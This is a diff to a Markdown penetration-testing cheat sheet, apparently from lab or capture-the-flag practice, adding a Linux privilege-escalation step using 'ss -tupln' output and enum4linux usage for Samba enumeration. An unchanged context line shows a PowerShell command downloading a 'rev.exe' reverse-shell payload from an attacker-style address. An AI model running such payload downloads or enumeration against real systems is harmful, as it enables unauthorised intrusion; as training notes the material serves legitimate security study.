@@ -160,6 +160,25 @@ Download file in Batch Via Powershell Module
 powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' -OutFile '.\rev.exe'"
 ```
 
+## Privilege Escalation 
+
+### Linux
+
+check for Network connections or Running Services
+```
+agent47@gamezone:~$ ss -tupln
+Netid State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
+udp   UNCONN     0      0       *:10000               *:*          
+udp   UNCONN     0      0       *:68                  *:*          
+tcp   LISTEN     0      128     *:22                  *:*          
+tcp   LISTEN     0      80     127.0.0.1:3306                *:*   
+tcp   LISTEN     0      128     *:10000               *:*          
+tcp   LISTEN     0      128    :::22                 :::*          
+tcp   LISTEN     0      128    :::80                 :::* 
+```
+7 Connections, now check runnign services in the ports 
+
+
 
 ## Operating Systems
 
@@ -200,7 +219,7 @@ powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' 
 | C:\Windows\SysWOW64    | Contains 32-bit system files on 64-bit systems.                                     |
 | C:\Windows\Temp        | Contains temporary files that can be used by applications and the system.           |
 
-## macOs
+### macOs
 
 | Directory               | Description                                                                                   |
 |-------------------------|-----------------------------------------------------------------------------------------------|
@@ -215,3 +234,29 @@ powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' 
 | /private/tmp            | Contains temporary files that can be used by applications and the system.                     |
 | /private/var            | Contains system log files and other variable data files.                                      |
 
+
+
+## SAMBA Target
+
+### enum4linux
+
+enum4linux is a tool used for enumerating information from Windows and Samba systems. Here are the commands to install and use it:
+```
+sudo apt-get install enum4linux
+```
+
+To run
+```
+enum4linux [options] [target IP]
+Here are some common options you can use with enum4linux:
+
+-a: Run all options.
+-U: Get user list.
+-S: Get share list.
+-P: Get password policy information.
+-G: Get group and member list.
+-M: Get machine and domain/workgroup name.
+
+but for Simplicity just run this 
+enum4linux -a 10.10.10.10
+```
